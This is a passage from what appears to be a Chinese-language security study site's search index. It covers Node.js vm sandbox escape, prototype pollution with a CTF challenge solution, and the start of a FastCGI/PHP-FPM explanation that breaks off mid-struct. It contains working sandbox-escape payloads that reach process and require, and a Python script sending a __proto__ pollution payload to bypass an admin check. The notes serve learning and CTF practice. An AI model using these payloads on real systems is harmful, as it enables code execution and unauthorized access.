<p>\u5b66\u4e60\u4f8b\u9898\uff1ahttps://www.anquanke.com/post/id/241429#h2-6</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/JavaScript/Node.js/nodejs%E6%B2%99%E7%9B%92/","title":"node.js\u6c99\u76d2\u9003\u9038","text":"<p>\u65e5\u5e38\u5f00\u53d1\u9700\u6c42\u4e2d\u6709\u65f6\u5019\u4e3a\u4e86\u8ffd\u6c42\u7075\u6d3b\u6027\u6216\u964d\u4f4e\u5f00\u53d1\u96be\u5ea6\uff0c\u4f1a\u5728\u4e1a\u52a1\u4ee3\u7801\u91cc\u76f4\u63a5\u4f7f\u7528eval/Function/vm \u7b49\u529f\u80fd\uff0c\u5176\u4e2d eval/Function \u7b97\u662f\u52a8\u6001\u6267\u884c JS\uff0c\u4f46\u65e0\u6cd5\u5c4f\u853d\u5f53\u524d\u6267\u884c\u73af\u5883\u7684\u4e0a\u4e0b\u6587\uff0c\u4f46 node.js \u91cc\u63d0\u4f9b\u4e86 vm \u6a21\u5757\uff0c\u76f8\u5f53\u4e8e\u4e00\u4e2a\u865a\u62df\u673a\uff0c\u53ef\u4ee5\u8ba9\u4f60\u5728\u6267\u884c\u4ee3\u7801\u65f6\u5019\u9694\u79bb\u5f53\u524d\u7684\u6267\u884c\u73af\u5883\uff0c\u907f\u514d\u88ab\u6076\u610f\u4ee3\u7801\u653b\u51fb\u3002</p> <p>\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u5355\u72ec\u62ff\u51fa\u6765\uff0c\u53ef\u80fd\u662f\u56e0\u4e3a\u6ca1\u5730\u65b9\u653e\u4e86</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/JavaScript/Node.js/nodejs%E6%B2%99%E7%9B%92/#vm","title":"vm \u57fa\u672c\u4ecb\u7ecd","text":"<p>vm \u6a21\u5757\u53ef\u5728 V8 \u865a\u62df\u673a\u4e0a\u4e0b\u6587\u4e2d\u7f16\u8bd1\u548c\u8fd0\u884c\u4ee3\u7801\uff0c\u865a\u62df\u673a\u4e0a\u4e0b\u6587\u53ef\u81ea\u884c\u914d\u7f6e\uff0c\u5229\u7528\u8be5\u7279\u6027\u505a\u5230\u6c99\u76d2\u7684\u6548\u679c\u3002\u4f8b\u5982\uff1a</p> <pre><code>const vm = require(\"vm\");const x = 1;const y = 2;const context = { x: 2, console };vm.createContext(context); // \u4e0a\u4e0b\u6587\u9694\u79bb\u5316\u5bf9\u8c61\u3002const code = \"console.log(x); console.log(y)\";vm.runInContext(code, context);// \u8f93\u51fa 2// Uncaught ReferenceError: y is not defin\nPlain Text\n</code></pre> <p>\u6839\u636e\u4ee5\u4e0a\u793a\u4f8b\uff0c\u53ef\u4ee5\u770b\u51fa\u548c eval/Function \u6700\u5927\u7684\u533a\u522b\u5c31\u662f\u53ef\u81ea\u5b9a\u4e49\u4e0a\u4e0b\u6587\uff0c\u4e5f\u5c31\u53ef\u4ee5\u63a7\u5236\u88ab\u6267\u884c\u4ee3\u7801\u7684\u8bbf\u95ee\u8d44\u6e90\u3002\u4f8b\u5982\u4ee5\u4e0a\u793a\u4f8b\uff0c\u9664\u4e86\u8bed\u8a00\u7684\u8bed\u6cd5\u3001\u5185\u7f6e\u5bf9\u8c61\u7b49\uff0c\u65e0\u6cd5\u8bbf\u95ee\u5230\u8d85\u51fa\u4e0a\u4e0b\u6587\u5916\u7684\u4efb\u4f55\u4fe1\u606f\uff0c\u6240\u4ee5\u793a\u4f8b\u4e2d\u51fa\u73b0\u4e86\u9519\u8bef\u63d0\u793a: y \u672a\u5b9a\u4e49</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/JavaScript/Node.js/nodejs%E6%B2%99%E7%9B%92/#_1","title":"\u9003\u9038\u8fc7\u7a0b","text":""},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/JavaScript/Node.js/nodejs%E6%B2%99%E7%9B%92/#_2","title":"\u9003\u9038\u793a\u4f8b\uff1a","text":"<pre><code>const vm = require(\"vm\");const ctx = {};vm.runInNewContext(   'this.constructor.constructor(\"return process\")().exit()',    ctx);console.log(\"Never gets executed.\");\nPlain Text\n</code></pre> <p>\u4ee5\u4e0a\u793a\u4f8b\u4e2d this \u6307\u5411 ctx \u5e76\u901a\u8fc7\u539f\u578b\u94fe\u7684\u65b9\u5f0f\u62ff\u5230\u6c99\u76d2\u5916\u7684 Funtion\uff0c\u5b8c\u6210\u9003\u9038\uff0c\u5e76\u6267\u884c\u9003\u9038\u540e\u7684 JS \u4ee3\u7801\u3002</p> <p>tmp = ctx.constructor; // Object</p> <p>exec = tmp.constructor; // Function</p> <p>exec(\"return Process\");</p> <p>\u9003\u9038\u53ef\u4ee5\u57fa\u672c\u5212\u5206\u4e3a\u8fd9\u4e09\u4e2a\u9636\u6bb5</p> <p>\u7531\u4e8e JS \u91cc\u6240\u6709\u5bf9\u8c61\u7684\u539f\u578b\u94fe\u90fd\u4f1a\u6307\u5411 Object.prototype\uff0c\u4e14 Object.prototype \u548c Function \u4e4b\u95f4\u662f\u76f8\u4e92\u6307\u5411\u7684\uff0c\u6240\u6709\u5bf9\u8c61\u901a\u8fc7\u539f\u578b\u94fe\u90fd\u80fd\u62ff\u5230 Function\uff0c\u6700\u7ec8\u5b8c\u6210\u6c99\u76d2\u9003\u9038\u5e76\u6267\u884c\u4ee3\u7801\u3002</p> <p>\u9003\u9038\u540e\u4ee3\u7801\u53ef\u4ee5\u6267\u884c\u5982\u4e0b\u4ee3\u7801\u62ff\u5230 require\uff0c\u4ece\u800c\u5e76\u52a0\u8f7d\u5176\u4ed6\u6a21\u5757\u529f\u80fd</p> <pre><code>const vm = require(\"vm\");const ctx = Object.create(null);ctx.data = {};vm.runInNewContext(   'this.data.constructor.constructor(\"return process\")().exit()',    ctx);// \u9003\u9038\u6210\u529f\uff01console.log(\"Never gets executed.\");\nPlain Text\n</code></pre> <p>\u539f\u6765\u5982\u679c\u5c06\u5bf9\u8c61\u7c7b\u578b\u8bbe\u7f6e\u4e3aNULL\uff0c\u90a3\u4e48\u5e94\u5f53\u4e3a\u62a5\u9519\uff0c\u4f46\u4e0a\u9762\u7684\u4f8b\u5b57\u662f\u53ef\u4ee5\u6b63\u786e\u6b63\u5e38\u6267\u884c\u7684\uff0c\u539f\u56e0\u5c31\u662f\u4e00\u5f00\u59cb\u6240\u8bf4\u7684\u6307\u5411\u95ee\u9898\u3002</p> <pre><code>const vm = require(\"vm\");const ctx = {    console,};vm.runInNewContext(    var exec = this.constructor.constructor;    var require =exec('return process.mainModule.constructor._load')();   console.log(require('fs'));`,    ctx);\nPlain Text\n</code></pre> <p>\u6700\u7ec8\u6267\u884c\u5916\u90e8\u4ee3\u7801\uff0c\u5b8c\u6210node.js\u6c99\u76d2\u9003\u9038\u3002</p> <p></p> <p></p> <p>\u4f8b\u9898\u5fd8\u8bb0\u5728\u54ea\u4e86\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/JavaScript/Node.js/Nodejs-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/%E5%8E%9F%E7%90%86/","title":"\u539f\u7406","text":""},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/JavaScript/Node.js/Nodejs-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/%E5%8E%9F%E7%90%86/#javascript","title":"javascript \u539f\u578b\u94fe","text":"<p>\u5728javascript\u4e2d\uff0c\u7ee7\u627f\u7684\u6574\u4e2a\u8fc7\u7a0b\u5c31\u79f0\u4e3a\u8be5\u7c7b\u7684\u539f\u578b\u94fe\u3002</p> <p>\u6bcf\u4e2a\u5bf9\u8c61\u7684\u90fd\u6709\u4e00\u4e2a\u6307\u5411\u4ed6\u7684\u539f\u578b(prototype)\u7684\u5185\u90e8\u94fe\u63a5\uff0c\u8fd9\u4e2a\u539f\u578b\u5bf9\u8c61\u53c8\u6709\u5b83\u81ea\u5df1\u7684\u539f\u578b\uff0c\u4e00\u76f4\u5230null\u4e3a\u6b62\u3002</p> <p>\u5728javascript\u4e2d\u4e00\u5207\u7686\u5bf9\u8c61\uff0c\u56e0\u4e3a\u6240\u6709\u7684\u53d8\u91cf\uff0c\u51fd\u6570\uff0c\u6570\u7ec4\uff0c\u5bf9\u8c61 \u90fd\u59cb\u4e8eobject\u7684\u539f\u578b\u5373object.prototype\uff0c\u4f46\u53ea\u6709\u7c7b\u6709\u5bf9\u8c61\uff0c\u5bf9\u8c61\u6ca1\u6709\uff0c\u5bf9\u8c61\u6709\u7684\u662f<code>__proto__</code>\u3002</p> <p>like:</p> <p>\u65e5\u671f\u65f6\uff1a</p> <p><code>f -&gt; Data.prototype -&gt; object.prototype-&gt;null</code></p> <p>\u51fd\u6570\u65f6\uff1a</p> <p><code>d -&gt; function.prototype -&gt; object.prototype-&gt;null</code></p> <p>\u6570\u7ec4\u65f6\uff1a</p> <p><code>c -&gt; array.prototype -&gt; object.prototype-&gt;null</code></p> <p>\u7c7b\u65f6\uff1a</p> <p><code>b -&gt; a.prototype -&gt; object.prototype-&gt;null</code></p> <p>\u5f53\u8981\u4f7f\u7528\u6216\u8f93\u51fa\u4e00\u4e2a\u53d8\u91cf\u65f6\uff1a\u9996\u5148\u4f1a\u5728\u672c\u5c42\u4e2d\u641c\u7d22\u76f8\u5e94\u7684\u53d8\u91cf\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u7684\u8bdd\uff0c\u5c31\u4f1a\u5411\u4e0a\u641c\u7d22\uff0c\u5373\u5728\u81ea\u5df1\u7684\u7236\u7c7b\u4e2d\u641c\u7d22\uff0c\u5f53\u7236\u7c7b\u4e2d\u4e5f\u6ca1\u6709\u65f6\uff0c\u5c31\u4f1a\u5411\u7956\u7236\u7c7b\u641c\u7d22\uff0c\u76f4\u5230\u6307\u5411null\uff0c\u5982\u679c\u6b64\u65f6\u8fd8\u6ca1\u6709\u641c\u7d22\u5230\uff0c\u5c31\u4f1a\u8fd4\u56de undefined\u3002</p> <p>\u539f\u578b\u94fe\u6c61\u67d3\u5c31\u662f\uff1a\u5728\u6211\u4eec\u60f3\u8981\u5229\u7528\u7684\u4ee3\u7801\u4e4b\u524d\u7684\u8d4b\u503c\u8bed\u53e5\u5982\u679c\u53ef\u63a7\u7684\u8bdd\uff0c\u6211\u4eec\u8fdb\u884c<code>__proto__</code>\u8d4b\u503c\uff0c\u4e4b\u540e\u5c31\u53ef\u4ee5\u5229\u7528\u4ee3\u7801\u4e86\u3002</p> <p>\u539f\u578b\u94fe\u6c61\u67d3\u4e00\u822c\u4f1a\u51fa\u73b0\u5728\u5bf9\u8c61\u3001\u6216\u6570\u7ec4\u7684\u952e\u540d\u6216\u5c5e\u6027\u540d\u53ef\u63a7,\u800c\u4e14\u662f\u8d4b\u503c\u8bed\u53e5\u7684\u60c5\u51b5\u4e0b\u3002</p> <pre><code>//\u7b80\u5355\u7684\u6765\u8bf4\u770b\u4e0b\u9762\u8fd9\u4e00\u5c0f\u6bb5\u4ee3\u7801\u5c31okvar obj = {\n   \"name\": \"ErDogQAQ\",\n   \"team\": \"ATL\"\n}\n\u200b\nconsole.log(obj.name);\nconsole.log(obj.team);\nconsole.log(obj);\nPlain Text\n</code></pre> <p></p> <p>\u53d1\u73b0\u4e86\u5bf9\u8c61\u4e2d\u5b58\u5728\u4e00\u4e2a\u540d\u4e3a<code>__proto__</code>\u7684\u952e(\u6211\u5728vscode\u4e0a\u81ea\u5df1\u5c1d\u8bd5\u6ca1\u6709\u8bd5\u51fa\u6765\uff0c\u67e5\u8be2\u597d\u50cf\u8ddfjson\u6587\u4ef6\u7684\u89e3\u6790\u6709\u5173)\uff0c\u800c\u4ed6\u5c31\u6307\u5411\u4ed6\u6784\u9020\u51fd\u6570\u7684\u539f\u578b\uff0c\u6211\u4eec\u540e\u9762\u4e5f\u901a\u8fc7<code>A.__proto__.a = 2;</code>\u8fd9\u6837\u4fee\u6539\u8fd9\u4e2a\u952e\u7684\u503c\u7684\u65b9\u5f0f\u9020\u6210\u4e86\u539f\u578b\u94fe\u6c61\u67d3\uff0c\u5462\u4e48\u6211\u4eec\u4e5f\u5c31\u6709\u601d\u8def\u4e86\uff0c\u53ea\u8981\u627e\u5230\u90a3\u4e9b\u6211\u4eec\u80fd\u591f\u63a7\u5236\u6570\u7ec4\uff08\u4e5f\u5c31\u662f\u5bf9\u8c61\uff09\u7684\u952e\u540d\u7684\u64cd\u4f5c\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u952e\u540d\u4e3a<code>__proto__</code>\u5e76\u63a7\u5236\u5b83\u7684\u503c\u7684\u65b9\u5f0f\u6765\u9020\u6210\u539f\u578b\u94fe\u6c61\u67d3\u3002</p> <p>\u5728\u5b9e\u9645\u4e2d\u80fd\u591f\u8fdb\u884c\u8fd9\u79cd\u53c2\u6570\u7684\u51fd\u6570\u4e00\u822c\u6709\uff1a</p> <p>\u5bf9\u8c61\u5408\u5e76\uff08merge\uff09\uff1b</p> <ul> <li> <p>\u5bf9\u8c61\u514b\u9686\uff08clone\uff09\uff08\u672c\u8d28\u8fd8\u662f\u5c06\u4e00\u4e2a\u5bf9\u8c61\u5408\u5e76\u5230\u7a7a\u5bf9\u8c61\u4e2d\uff09</p> </li> <li> <p>\u6240\u4ee5\u6765\u7a0d\u5fae\u5c1d\u8bd5\u4e00\u4e0b\uff1a</p> </li> </ul> <pre><code>function merge(target, source) {\nfor (let key in source) {\nif (key in source &amp;&amp; key in target) {\nmerge(target[key], source[key])\n} else {\ntarget[key] = source[key]\n}\n}\n}let o1 = {}\nlet o2 = JSON.parse('{\"a\": 1, \"__proto__\": {\"b\": 2}}')\nmerge(o1, o2)\nconsole.log(o1.a, o1.b)\no3 = {}\nconsole.log(o3.b)\nconsole.log(o2)\nPlain Text\n</code></pre> <p>\u8fd9\u91cc\u7684json.parse\u5c31\u662f\u524d\u9762\u7684\u89e3\u6790\u95ee\u9898\u4e86\uff0c\u8fd9\u6837\u7684\u8fd0\u884c\u7ed3\u679c\u662f\uff1a</p> <p></p> <p>\u6211\u4eec\u53d1\u73b0o3.b\u5e26\u4e0a\u4e86\u503c\u3002</p> <p>\u7ed3\u5408\u524d\u9762\u63d0\u5230\u7684javascript\u7684\u7279\u6027\u6211\u4eec\u4e0d\u96be\u77e5\u9053\uff1a</p> <p>o2.__proto__\u6307\u5411\u7684\u662fo2\u7684\u57fa\u7c7b\uff0c\u6211\u4eec\u5047\u5b9a\u8ba4\u4e3a\u662fObeject\u7c7b</p> <p>o3\u672c\u6765\u5e94\u8be5\u662f{\u201cproto\u201d:OBject}(\u800c\u4e14\u8fd9\u4e2a\u5c5e\u6027\u4e00\u822c\u662f\u9690\u85cf\u7684)</p> <p>\u5f53\u8fdb\u884c\u8f93\u51fa\u67e5\u8be2\u65f6o3\u662f\u6ca1\u6709\u8fd9\u4e2a\u5c5e\u6027\u7684\uff0c\u6ca1\u6709\u7684\u8bdd\u5c31\u4f1a\u53bb\u5b83\u7684\u4e0a\u4e00\u5c42\u4e5f\u5c31\u662f__proto__\u6240\u6307\u5411\u7684\u7c7b\u53bb\u5bfb\u627e\u8fd9\u4e2ab\u5c5e\u6027\u3002\u800c\u5728\u5408\u5e76\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u5c06o2\u4e2d\u7684__proto__\u503c\u4e5f\u5408\u5e76\u4e86\u8d77\u6765\uff0c\u76f8\u5f53\u4e8e\u5bf9\u540c\u4e00\u5c42\u7c7b\u7684__proto__\u4e2d\u6dfb\u52a0\u4e86\u4e00\u4e2a\u5c5e\u6027{\"b\":\"2\"}\uff0c\u4e5f\u5c31\u5728Object\u7c7b\u521b\u5efa\u4e86\u4e00\u4e2a\u8fd9\u6837\u7684\u5c5e\u6027\uff0c\u6240\u4ee5\u6700\u7ec8\u7684\u6307\u5411\u662f\uff1a</p> <pre><code>o1-&gt;o2-&gt;__proto__-&gt;Objecto3-&gt;\"b\"-&gt;__proto__-&gt;Object-&gt;\"b\"=2\nPlain Text\n</code></pre> <p>\u8fd9\u5c31\u662f\u6f0f\u6d1e\u539f\u7406\uff0c\u5728\u6839\u7c7b\u6c61\u67d3\u51fa\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u5143\u7d20\uff0c\u518d\u5229\u7528javascript\u7684\u9012\u5f52\u641c\u7d22\u8fc7\u7a0b\u627e\u5230\u8fd9\u4e2a\u6839\u7c7b\u4e2d\u7684\u5c5e\u6027\uff0c\u7531\u4e8e\u6c61\u67d3\u7684\u5143\u7d20\u6211\u4eec\u53ef\u63a7\uff0c\u6700\u7ec8\u76f8\u5f53\u4e8e\u6211\u4eec\u52ab\u6301\u4e86\u5b50\u7c7b\u4e2d\u7684\u67d0\u4e2a\u53c2\u6570\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/JavaScript/Node.js/Nodejs-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/%E5%AE%9E%E6%88%98/","title":"\u5b9e\u6218","text":"<p><pre><code>```javascript\nconst http = require(\"http\");\nconst express = require(\"express\");\nconst bodyParser = require(\"body-parser\");\nconst mixme = require(\"mixme\");\nconst session = require(\"express-session\");\nconst randomize = require(\"randomatic\");\nconst morgan = require(\"morgan\");\nconst app = express();//\u7c7b\u4f3c\u5b9a\u4e49\u7684\u5b8f\u5e38\u91cf\napp.set(\"json escape\", true);//\u8f6c\u4e49\napp.use(morgan(\"short\"));\napp.use(bodyParser.urlencoded({ extended: true })).use(bodyParser.json());\n// app.use(express.json());\napp.use(\nsession({\nname: \"session\",\nsecret: randomize(\"aA0\", 16),\nresave: false,\nsaveUninitialized: false,\n})\n);\nconst Super = {\npassone: process.env.sperson,//\u73af\u5883\u53d8\u91cf\u63a7\u5236\n};\nfunction blacklist(url) {\nvar evilwords = [\"DirectoryIterator\", \"FilesystemIterator\", \"GlobIterator\"];//\u8fd9\u91cc\u9762\u90fd\u662fphp\u7684\u7c7b\u540d\nvar arrayLen = evilwords.length;\nfor (var i = 0; i &lt; arrayLen; i++) {\nconst trigger = url.includes(evilwords[i]);\nif (trigger === true) {\nreturn true;\n}\n}\n}\n//TODO\n//get url content\napp.post(\"/getinfo\", (req, res) =&gt; {\nconsole.log(req.body);\nif (req.body.userid === undefined || req.body.key === undefined) {\nres.send(\"you want to post null?\");\n} else {\nlet userid = req.body.userid;\nlet key = req.body.key;\nconsole.log(userid);\nconsole.log(key);//\u5728\u63a7\u5236\u53f0\u4e0a\u8f93\u51fa\u4fe1\u606f\nif (Super[userid] === key) {\nres.send(\n\"admin!\\nyou can goto ***** endpoint to hack!\"\n);\n} else {\nres.send(\"You are not the Super, so I cannot give you the truth.\");\n}\n}\n});\napp.all(\"/\", (req, res) =&gt; {\nlet data = { userid: [], key: [] };\nconsole.log(data);\nconsole.log(req.body);\nif (req.method == \"POST\" &amp;&amp; req.body) {\ndata = mixme.merge(data, req.body);\nreq.session.data = data;\n// console.log(\"After MERGE: \" + Super[\"test\"]);\n}\nres.send(\"to be admin and you will find it!\");\n});\napp.listen(3000, () =&gt; console.log(`Example app listening on port 3000!`));\n</code></pre> Plain Text <pre><code>\u8fd9\u5c31\u662f\u90a3\u5929\u7684\u6e90\u7801\n\n\n\u7b2c66\u884c\u6709\u4e2amerge\u5408\u5e76\u51fd\u6570\n\n\n51\u884c\u6709\u4e2a\u6bd4\u8f83\u7ed5\u8fc7\n\n\n\u6211\u4eec\u901a\u8fc7\u539f\u578b\u94fe\u7684\u6c61\u67d3\u6765\u8fc7\n\n\n\u4ee3\u7801\u903b\u8f91\u4e0d\u662f\u5f88\u96be\n\n\n\u6240\u4ee5\u6700\u7ec8\u6211\u4eec\u53ea\u9700\u8981\u4f20\u53c2\u5c31ok\u3002\u540e\u53f0\u4f30\u8ba1\u662f\u6709\u4e1c\u897f\u662f\u4e00\u76f4\u5728\u5220\u9664\uff0c\u6240\u4ee5\u6700\u597d\u6574\u4e2a\u811a\u672c\u3002\n\n\n```plain\nimport requests\nimport time\nurl1='127.0.0.1'\nurl2='127.0.0.1/getinfo'\npost_data1='{\"__proto__\":{\"a\":\"b\"}}'\npost_data2='{\"userid\":\"a\",\"key\":\"b\"}'\nheaders = {\n\"Content-Type\":\"application/json\"\n}\nreqs1=requests.post(url1,data=post_data1,headers=headers)\nprint(reqs1.text)\ntime.sleep(0.5)\nreqs2=requests.post(url2,data=post_data2,headers=headers)\nprint(reqs2.text)\nPlain Text\n</code></pre></p> <p>\uff08\u6211\u6ca1\u7528\u8fc7\u4f46\u5e94\u8be5\u5c31\u8fd9\u6837\u5427...\uff09</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/","title":"PHP-FPM\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e","text":"<p>Fastcgi\u5176\u5b9e\u662f\u4e00\u4e2a\u901a\u4fe1\u534f\u8bae\uff0c\u548cHTTP\u534f\u8bae\u4e00\u6837\uff0c\u90fd\u662f\u8fdb\u884c\u6570\u636e\u4ea4\u6362\u7684\u4e00\u4e2a\u901a\u9053\u3002</p> <p>HTTP\u534f\u8bae\u662f\u6d4f\u89c8\u5668\u548c\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\u8fdb\u884c\u6570\u636e\u4ea4\u6362\u7684\u534f\u8bae\uff0c\u6d4f\u89c8\u5668\u5c06HTTP\u5934\u548cHTTP\u4f53\u7528\u67d0\u4e2a\u89c4\u5219\u7ec4\u88c5\u6210\u6570\u636e\u5305\uff0c\u4ee5TCP\u7684\u65b9\u5f0f\u53d1\u9001\u5230\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\uff0c\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\u6309\u7167\u89c4\u5219\u5c06\u6570\u636e\u5305\u89e3\u7801\uff0c\u5e76\u6309\u8981\u6c42\u62ff\u5230\u7528\u6237\u9700\u8981\u7684\u6570\u636e\uff0c\u518d\u4ee5HTTP\u534f\u8bae\u7684\u89c4\u5219\u6253\u5305\u8fd4\u56de\u7ed9\u670d\u52a1\u5668\u3002</p> <p>\u7c7b\u6bd4HTTP\u534f\u8bae\u6765\u8bf4\uff0cfastcgi\u534f\u8bae\u5219\u662f\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\u548c\u67d0\u4e2a\u8bed\u8a00\u540e\u7aef\u8fdb\u884c\u6570\u636e\u4ea4\u6362\u7684\u534f\u8bae\u3002Fastcgi\u534f\u8bae\u7531\u591a\u4e2arecord\u7ec4\u6210\uff0crecord\u4e5f\u6709header\u548cbody\u4e00\u8bf4\uff0c\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\u5c06\u8fd9\u4e8c\u8005\u6309\u7167fastcgi\u7684\u89c4\u5219\u5c01\u88c5\u597d\u53d1\u9001\u7ed9\u8bed\u8a00\u540e\u7aef\uff0c\u8bed\u8a00\u540e\u7aef\u89e3\u7801\u4ee5\u540e\u62ff\u5230\u5177\u4f53\u6570\u636e\uff0c\u8fdb\u884c\u6307\u5b9a\u64cd\u4f5c\uff0c\u5e76\u5c06\u7ed3\u679c\u518d\u6309\u7167\u8be5\u534f\u8bae\u5c01\u88c5\u597d\u540e\u8fd4\u56de\u7ed9\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\u3002</p> <p>\u548cHTTP\u5934\u4e0d\u540c\uff0crecord\u7684\u5934\u56fa\u5b9a8\u4e2a\u5b57\u8282\uff0cbody\u662f\u7531\u5934\u4e2d\u7684contentLength\u6307\u5b9a\uff0c\u5176\u7ed3\u6784\u5982\u4e0b\uff1a</p> <pre><code>typedef struct {\n/* Header */\nunsigned char version; // \u7248\u672c\nunsigned char type; // \u672c\u6b21record\u7684\u7c7b\u578b\nunsigned char requestIdB1; // \u672c\u6b21record\u5bf9\u5e94\u7684\u8bf7\u6c42id\nunsigned char requestIdB0;\nunsigned char contentLengthB1; // body\u4f53\u7684\u5927\u5c0f\nunsigned char contentLengthB0;\nunsigned char paddingLength; // \u989d\u5916\u5757\u5927\u5c0f\nunsigned char reserved;\n\n/* Body */\nunsigned char contentData[contentLength];\nunsigned char paddingData[paddingLength];\n} FCGI_Record;\n</code></pre> <p>\u5934\u75318\u4e2auchar\u7c7b\u578b\u7684\u53d8\u91cf\u7ec4\u6210\uff0c\u6bcf\u4e2a\u53d8\u91cf1\u5b57\u8282\u3002\u5176\u4e2d\uff0c<code>requestId</code>\u5360\u4e24\u4e2a\u5b57\u8282\uff0c\u4e00\u4e2a\u552f\u4e00\u7684\u6807\u5fd7id\uff0c\u4ee5\u907f\u514d\u591a\u4e2a\u8bf7\u6c42\u4e4b\u95f4\u7684\u5f71\u54cd\uff1b<code>contentLength</code>\u5360\u4e24\u4e2a\u5b57\u8282\uff0c\u8868\u793abody\u7684\u5927\u5c0f\u3002</p> <p>\u8bed\u8a00\u7aef\u89e3\u6790\u4e86fastcgi\u5934\u4ee5\u540e\uff0c\u62ff\u5230<code>contentLength</code>\uff0c\u7136\u540e\u518d\u5728TCP\u6d41\u91cc\u8bfb\u53d6\u5927\u5c0f\u7b49\u4e8e<code>contentLength</code>\u7684\u6570\u636e\uff0c\u8fd9\u5c31\u662fbody\u4f53\u3002</p> <p>Body\u540e\u9762\u8fd8\u6709\u4e00\u6bb5\u989d\u5916\u7684\u6570\u636e\uff08Padding\uff09\uff0c\u5176\u957f\u5ea6\u7531\u5934\u4e2d\u7684paddingLength\u6307\u5b9a\uff0c\u8d77\u4fdd\u7559\u4f5c\u7528\u3002\u4e0d\u9700\u8981\u8be5Padding\u7684\u65f6\u5019\uff0c\u5c06\u5176\u957f\u5ea6\u8bbe\u7f6e\u4e3a0\u5373\u53ef\u3002</p> <p>\u53ef\u89c1\uff0c\u4e00\u4e2afastcgi record\u7ed3\u6784\u6700\u5927\u652f\u6301\u7684body\u5927\u5c0f\u662f<code>2^16</code>\uff0c\u4e5f\u5c31\u662f65536\u5b57\u8282\u3002</p> <p><code>type</code>\u5c31\u662f\u6307\u5b9a\u8be5record\u7684\u4f5c\u7528\u3002\u56e0\u4e3afastcgi\u4e00\u4e2arecord\u7684\u5927\u5c0f\u662f\u6709\u9650\u7684\uff0c\u4f5c\u7528\u4e5f\u662f\u5355\u4e00\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5728\u4e00\u4e2aTCP\u6d41\u91cc\u4f20\u8f93\u591a\u4e2arecord\u3002\u901a\u8fc7<code>type</code>\u6765\u6807\u5fd7\u6bcf\u4e2arecord\u7684\u4f5c\u7528\uff0c\u7528<code>requestId</code>\u4f5c\u4e3a\u540c\u4e00\u6b21\u8bf7\u6c42\u7684id\u3002</p> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u6bcf\u6b21\u8bf7\u6c42\uff0c\u4f1a\u6709\u591a\u4e2arecord\uff0c\u4ed6\u4eec\u7684<code>requestId</code>\u662f\u76f8\u540c\u7684\u3002</p> <p>\u5217\u51fa\u6700\u4e3b\u8981\u7684\u51e0\u79cd<code>type</code>\uff1a</p> <p></p> <p>\u770b\u4e86\u8fd9\u4e2a\u8868\u683c\u5c31\u5f88\u6e05\u695a\u4e86\uff0c\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\u548c\u540e\u7aef\u8bed\u8a00\u901a\u4fe1\uff0c\u7b2c\u4e00\u4e2a\u6570\u636e\u5305\u5c31\u662f<code>type</code>\u4e3a1\u7684record\uff0c\u540e\u7eed\u4e92\u76f8\u4ea4\u6d41\uff0c\u53d1\u9001<code>type</code>\u4e3a4\u30015\u30016\u30017\u7684record\uff0c\u7ed3\u675f\u65f6\u53d1\u9001<code>type</code>\u4e3a2\u30013\u7684record\u3002\u5f53\u540e\u7aef\u8bed\u8a00\u63a5\u6536\u5230\u4e00\u4e2a<code>type</code>\u4e3a4\u7684record\u540e\uff0c\u5c31\u4f1a\u628a\u8fd9\u4e2arecord\u7684body\u6309\u7167\u5bf9\u5e94\u7684\u7ed3\u6784\u89e3\u6790\u6210key-value\u5bf9\uff0c\u8fd9\u5c31\u662f\u73af\u5883\u53d8\u91cf\u3002\u73af\u5883\u53d8\u91cf\u7684\u7ed3\u6784\u5982\u4e0b\uff1a</p> <pre><code>typedef struct {\nunsigned char nameLengthB0;  /* nameLengthB0  &gt;&gt; 7 == 0 */\nunsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */\nunsigned char nameData[nameLength];\nunsigned char valueData[valueLength];\n} FCGI_NameValuePair11;\n\ntypedef struct {\nunsigned char nameLengthB0;  /* nameLengthB0  &gt;&gt; 7 == 0 */\nunsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */\nunsigned char valueLengthB2;\nunsigned char valueLengthB1;\nunsigned char 